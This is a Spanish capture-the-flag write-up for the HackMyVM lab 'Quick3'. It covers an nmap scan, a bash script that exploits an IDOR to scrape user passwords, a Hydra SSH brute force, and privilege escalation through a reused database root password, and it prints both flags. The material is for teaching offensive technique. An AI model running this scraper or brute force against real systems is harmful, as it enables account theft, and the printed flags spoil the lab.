---
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Quick3 HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-21 03:55 EDT
Nmap scan report for 192.168.1.146
Host is up (0.00099s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2e:7a:1f:17:57:44:6f:7f:f9:ce:ab:a1:4f💿c7:19 (ECDSA)
|_  256 93:7e:d6:c9:03:5b:a1:ee:1d:54:d0:f0:27:0f:13:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Quick Automative - Home
|_http-server-header: Apache/2.4.52 (Ubuntu)
MAC Address: 08:00:27:28:12:35 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.44 seconds
```

Veremos un puerto `80` en el que aloja una pagina web, si entramos dentro de la misma veremos una pagina de coches normales en el que aparentemente no veremos nada interesante, por lo que vamos a realizar un poco de `fuzzing`.

Si le damos a `Make Appointment` veremos que nos lleva como a un `login` pero nos podremos crear una cuenta, por lo que vamos a crearnosla.

Una vez que nos la hayamos creado y nos hayamos logueado, veremos un panel de usuario normal y corriente, pero si nos vamos a `MyProfile` veremos en la `URL` algo peculiar y es lo siguiente:

```
URL = http://<IP>/customer/user.php?id=29
```

Vemos que esta exponiendo el `id` por lo que podremos intentar realizar un `IDOR` para enumerar usuario y con ello su informacion incluyendo las contraseñas, para crearnos un diccionario personalizado de lo que recolectemos.

Si probamos a meter lo siguiente:

```
URL = http://<IP>/customer/user.php?id=1
```

Veremos que funciona y nos esta mostrando la informacion del usuario `quick`, para poder ver la password podremos cambiar el campo de `password` a `text` de esta forma:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-21 100253.png" alt=""><figcaption></figcaption></figure>

En ese campo pondremos `text` quedando asi:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-21 100342.png" alt=""><figcaption></figcaption></figure>

Por lo que estaremos viendo la contraseña de dicho usuario, tendremos que realizar esto con los `28` usuarios que pueden estar logueados, por lo que vamos a crearnos un pequeño script de `bash` de esta forma:

> searchInfo.sh

```bash
#!/bin/bash

# Limpiar ficheros al inicio
> users.txt
> pass.txt

for id in $(seq 1 28); do
    echo "[+] Fetching ID: $id"
    html=$(curl -s "http://<IP>/customer/user.php?id=$id")

    # Extraer valor completo del campo name
    full_name=$(echo "$html" | grep 'input type="text" id="name"' | sed -n 's/.*value="\([^"]*\)".*/\1/p')
    
    # Quedarse solo con la primera palabra y poner inicial en minúscula
    name=$(echo "$full_name" | awk '{print $1}' | sed 's/^\(.\)/\L\1/')

    # Extraer password
    password=$(echo "$html" | grep 'input type="password" id="oldpassword"' | sed -n 's/.*value="\([^"]*\)".*/\1/p')

    if [ -n "$name" ] || [ -n "$password" ]; then
        echo "    Name: $name"
        echo "    Password: $password"

        # Guardar en ficheros
        echo "$name" >> users.txt
        echo "$password" >> pass.txt
    else
        echo "    No name or password found"
    fi
done
```

Cambiamos la `<IP>` por la nuestra real de la maquina victima, ahora lo ejecutaremos de esta forma:

```shell
chmod +x searchInfo.sh
bash searchInfo.sh
```

Info:

```
[+] Fetching ID: 1
    Name: quick
    Password: q27QAO6FeisAAtbW
[+] Fetching ID: 2
    Name: nick
    Password: H01n8X0fiiBhsNbI
[+] Fetching ID: 3
    Name: andrew
    Password: oyS6518WQxGK8rmk
[+] Fetching ID: 4
    Name: jack
    Password: 2n5kKKcvumiR7vrz
[+] Fetching ID: 5
    Name: mike
    Password: 6G3UCx6aH6UYvJ6m
[+] Fetching ID: 6
    Name: john
    Password: k2I9CR15E9O4G1KI
[+] Fetching ID: 7
    Name: jane
    Password: 62D4hqCrjjNCuxOj
...................................<RESTO DE INFO>.................................
```

Esto lo guardara los nombre de usuario en un `users.txt` y las contraseñas en un `pass.txt` de forma automatica, quedando algo asi:

> users.txt

```
quick
nick
andrew
jack
mike
john
jane
frank
fred
sandra
bill
james
donald
michelle
jeff
lee
laura
coos
neil
teresa
krystal
juan
john
misty
lara
james
dick
anna
```

> pass.txt

```
q27QAO6FeisAAtbW
H01n8X0fiiBhsNbI
oyS6518WQxGK8rmk
2n5kKKcvumiR7vrz
6G3UCx6aH6UYvJ6m
k2I9CR15E9O4G1KI
62D4hqCrjjNCuxOj
w9Y021wsWRdkwuKf
1vC35FcnMfmGsI5c
fL01z7z8MawnIdAq
vDKZtVfZuaLN8BEB7f
iakbmsaEVHhN2XoaXB
wv5awQybZTdvZeMGPb
wv5awQybZTdvZeMGPb
Kn4tLAPWDbFK9Zv2
SS2mcbW58a8reLYQ
e8v3JQv3QVA3aNrD
8RMVrdd82n5ymc4Z
STUK2LNwNRU24YZt
mvQnTzCX9wcNtzbW
A9n3XMuB9XmFmgr5
DX5cM3yFg6wJgdYb
yT9Hy2fhX7VhmEkj
aCSKXmzhHL9XPnqr
GUFTV4ERd7QAexxw
fMYFNFzCRMF6ceKe
w5dWfAqNNLtWVvcW
FVYtCpc8FGVHEBXV
```

Ahora vamos a realizar un ataque de fuerza bruta con `hydra` por `SSH` de esta forma:

## Escalate user mike

### Hydra

```shell
hydra -L users.txt -P pass.txt ssh://<IP> -t 64 -I
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-21 04:29:34
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 841 login tries (l:29/p:29), ~14 tries per task
[DATA] attacking ssh://192.168.1.146:22/
[22][ssh] host: 192.168.1.146   login: mike   password: 6G3UCx6aH6UYvJ6m
[STATUS] 290.00 tries/min, 290 tries in 00:01h, 584 to do in 00:03h, 31 active
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
```

Con esto veremos que ha funcionado y habremos descubierto las credenciales del usuario `mike`, por lo que vamos a conectarnos por `SSH`.

### SSH

```shell
ssh mike@<IP>
```

Metemos como contraseña `6G3UCx6aH6UYvJ6m` y veremos que estaremos dentro, por lo que leeremos la `flag` del usuario.

> user.txt

```

                                                                                                                                                                                                                    
     QQQQQQQQQ                         iiii                      kkkkkkkk                 333333333333333   
   QQ:::::::::QQ                      i::::i                     k::::::k                3:::::::::::::::33 
 QQ:::::::::::::QQ                     iiii                      k::::::k                3::::::33333::::::3
Q:::::::QQQ:::::::Q                                              k::::::k                3333333     3:::::3
Q::::::O   Q::::::Quuuuuu    uuuuuu  iiiiiii     cccccccccccccccc k:::::k    kkkkkkk                 3:::::3
Q:::::O     Q:::::Qu::::u    u::::u  i:::::i   cc:::::::::::::::c k:::::k   k:::::k                  3:::::3
Q:::::O     Q:::::Qu::::u    u::::u   i::::i  c:::::::::::::::::c k:::::k  k:::::k           33333333:::::3 
Q:::::O     Q:::::Qu::::u    u::::u   i::::i c:::::::cccccc:::::c k:::::k k:::::k            3:::::::::::3  
Q:::::O     Q:::::Qu::::u    u::::u   i::::i c::::::c     ccccccc k::::::k:::::k             33333333:::::3 
Q:::::O     Q:::::Qu::::u    u::::u   i::::i c:::::c              k:::::::::::k                      3:::::3
Q:::::O  QQQQ:::::Qu::::u    u::::u   i::::i c:::::c              k:::::::::::k                      3:::::3
Q::::::O Q::::::::Qu:::::uuuu:::::u   i::::i c::::::c     ccccccc k::::::k:::::k                     3:::::3
Q:::::::QQ::::::::Qu:::::::::::::::uui::::::ic:::::::cccccc:::::ck::::::k k:::::k        3333333     3:::::3
 QQ::::::::::::::Q  u:::::::::::::::ui::::::i c:::::::::::::::::ck::::::k  k:::::k       3::::::33333::::::3
   QQ:::::::::::Q    uu::::::::uu:::ui::::::i  cc:::::::::::::::ck::::::k   k:::::k      3:::::::::::::::33 
     QQQQQQQQ::::QQ    uuuuuuuu  uuuuiiiiiiii    cccccccccccccccckkkkkkkk    kkkkkkk      333333333333333   
             Q:::::Q                                                                                        
              QQQQQQ


  
                                     _...----""""""""""""----..._
                                   .'       ______________       `-.
                                  :_..--"""" ___......___ """""----..
                                .' _.---"""""   (______) `"""""----. `.
                               / .'   .----.               .-----.  \  \
                              / /    /      \             /       \  \  \
                      .---.  / /    :        :           :,-"""""-.:  \  \  .---.
                     :    `\: :   __:____....J.---------.:...______:   :  :'     :
                      `"""-._ `"""_______......---------......______`""' _'.-"""'
                          / \"""""                                  """""/`.
                         / `.`.                                        .' ' `.
                        /    \ `.                                    .' .'    \
                       /      `. `-._                            _.-' .'      _:
                     :|`""----.._    `"""--------------------"""'     _..---"" |:
                     ::   /""\  _`.    _____..............______    .'_ /""\   ::
                     | `._\__/ `" `.  : 888888888P"":'.d888888P '  : '" \__/_.' |
                     |`-._  `""----'  : T888888P'|__|88888888P  :  `----"""'  _.|
                     :    `"-._     :  `.`T8P" .d88888888888P'.'  '     __.-""  |
                     :`.        `""` '   ``"""""""""""""""""     .'"""""       ,:
                     |: `-,_          \                         :       __...-':|
                     |:   '88P`Tp.    `d88888888888888888888888P    .dP`T88P   :|
                     :8p.  `8b_d88b    888888888888888888888888'   d88b_dP'   d8:
                     '8888b..___`""     `"""""""""""""""""""""'    `""___..gd888'
                      88888888  ``"""""----------------------""""'""""  88888888
                      '888888P                                    fsc   T888888P
                       `"""""
                
                                HMV{717f274ee66f8541a3031f175f615e72}
```

## Escalate Privileges

Primero haremos `bash` para salir de la restriccion de `rbash` en la que estamos.

Si buscamos un poco, en la seccion de `/var/www/html` vamos a buscar el siguiente archivo que suele ser el que almacena las contraseñas en la `DDBB` para la aplicacion.

```shell
find . -name "*.php" 2>/dev/null
```

Info:

```
./customer/config.php
./customer/cars.php
./customer/contact.php
./customer/remove.php
./customer/updatepassword.php
./customer/user.php
./customer/updateuser.php
./customer/dashboard.php
./customer/submitcar.php
./customer/logout.php
./customer/login.php
./customer/index.php
./lib/waypoints/links.php
```

Vemos que la primera linea es la que nos interesa, por lo que vamos a leerlo.

```shell
cat customer/config.php
```

Info:

```
<?php
// config.php
$conn = new mysqli('localhost', 'root', 'fastandquicktobefaster', 'quick');

// Check connection
if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
}
?>
```

Vemos informacion bastante interesante, en la cual estamos viendo una `password` que es de `root`, por lo que vamos a probar si a nivel de sistema tambien tuviera la misma.

```shell
su root
```

Metemos como contraseña `fastandquicktobefaster`...

Info:

```
root@quick3:~# whoami
root
```

Veremos que ha funcionado, por lo que seremos dicho usuario y leeremos la `flag` de `root`.

> root.txt

```
                                                                                                                                                                                                                   
     QQQQQQQQQ                         iiii                      kkkkkkkk                 333333333333333   
   QQ:::::::::QQ                      i::::i                     k::::::k                3:::::::::::::::33 
 QQ:::::::::::::QQ                     iiii                      k::::::k                3::::::33333::::::3
Q:::::::QQQ:::::::Q                                              k::::::k                3333333     3:::::3
Q::::::O   Q::::::Quuuuuu    uuuuuu  iiiiiii     cccccccccccccccc k:::::k    kkkkkkk                 3:::::3
Q:::::O     Q:::::Qu::::u    u::::u  i:::::i   cc:::::::::::::::c k:::::k   k:::::k                  3:::::3
Q:::::O     Q:::::Qu::::u    u::::u   i::::i  c:::::::::::::::::c k:::::k  k:::::k           33333333:::::3 
Q:::::O     Q:::::Qu::::u    u::::u   i::::i c:::::::cccccc:::::c k:::::k k:::::k            3:::::::::::3  
Q:::::O     Q:::::Qu::::u    u::::u   i::::i c::::::c     ccccccc k::::::k:::::k             33333333:::::3 
Q:::::O     Q:::::Qu::::u    u::::u   i::::i c:::::c              k:::::::::::k                      3:::::3
Q:::::O  QQQQ:::::Qu::::u    u::::u   i::::i c:::::c              k:::::::::::k                      3:::::3
Q::::::O Q::::::::Qu:::::uuuu:::::u   i::::i c::::::c     ccccccc k::::::k:::::k                     3:::::3
Q:::::::QQ::::::::Qu:::::::::::::::uui::::::ic:::::::cccccc:::::ck::::::k k:::::k        3333333     3:::::3
 QQ::::::::::::::Q  u:::::::::::::::ui::::::i c:::::::::::::::::ck::::::k  k:::::k       3::::::33333::::::3
   QQ:::::::::::Q    uu::::::::uu:::ui::::::i  cc:::::::::::::::ck::::::k   k:::::k      3:::::::::::::::33 
     QQQQQQQQ::::QQ    uuuuuuuu  uuuuiiiiiiii    cccccccccccccccckkkkkkkk    kkkkkkk      333333333333333   
             Q:::::Q                                                                                        
              QQQQQQ



                           __---~~~~--__                      __--~~~~---__
                          `\---~~~~~~~~\\                    //~~~~~~~~---/'
                            \/~~~~~~~~~\||                  ||/~~~~~~~~~\/
                                        `\\                //'
                                          `\\            //'
                                            ||          ||
                                  ______--~~~~~~~~~~~~~~~~~~--______
                             ___ // _-~                        ~-_ \\ ___
                            `\__)\/~                              ~\/(__/'
                             _--`-___                            ___-'--_
                           /~     `\ ~~~~~~~~------------~~~~~~~~ /'     ~\
                          /|        `\         ________         /'        |\
                         | `\   ______`\_      \------/      _/'______   /' |
                         |   `\_~-_____\ ~-________________-~ /_____-~_/'   |
                         `.     ~-__________________________________-~     .'
                          `.      [_______/------|~~|------\_______]      .'
                           `\--___((____)(________\/________)(____))___--/'
                            |>>>>>>||                            ||<<<<<<|
                            `\<<<<</'                            `\>>>>>/'


                                HMV{f178761104e933f9341f13f64b38538a}
```
